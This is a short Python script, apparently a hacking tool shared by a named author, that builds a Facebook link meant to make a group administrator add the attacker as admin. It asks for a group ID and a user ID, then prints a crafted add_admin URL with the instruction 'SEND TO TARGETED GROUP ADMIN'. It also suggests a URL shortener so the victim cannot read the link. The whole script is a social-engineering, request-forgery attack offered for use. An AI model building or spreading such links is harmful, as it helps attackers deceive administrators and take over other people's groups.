
import time,sys
from termcolor import colored

def Gh():
	
	print(colored("""

{
                                                     
########
#      ## *************************************
#       ##    __Tutorial/Channel__[youtube.com/anonymousbghh]
########
#       ##    __Repository__[https://github.com/josifkhan/]
#      ##    __Author_Name__[MD Josif Khan]
#######_______________}
                                                             
_________                    ________________________________
                                        BANgLADESH           
                                           V1.0 \n""","""red"""))

	def gh():

		group=input("GROUP ID: ")
		
		if not len(group)>=13:
			print(colored("Invalid group id","red"))
			time.sleep(1)
			gh()
		else:
			def gh2():		
				user=input("USER ID: ")
				if not len(user)>=13:
					print(colored("Invalid user id","red"))
					time.sleep(1)
					gh2()
			
				else:
					def adder():
						print(colored("\n\nCOPY THE LINK BELOW, AND SEND TO TARGETED GROUP ADMIN\n","green"))
						print(colored(f"[-] https://m.facebook.com/group/add_admin/?group_id={group}&user_id={user}&added&_rdrChange$ [-]","cyan"))
						print("\n[*Tip] USING URL SHORTNER CAN MAKE YOUR LINK HARD TO READ.")
						input("Press Enter To Exit.")
						sys.exit("Done!")
					adder()
			gh2()
	gh()
Gh()
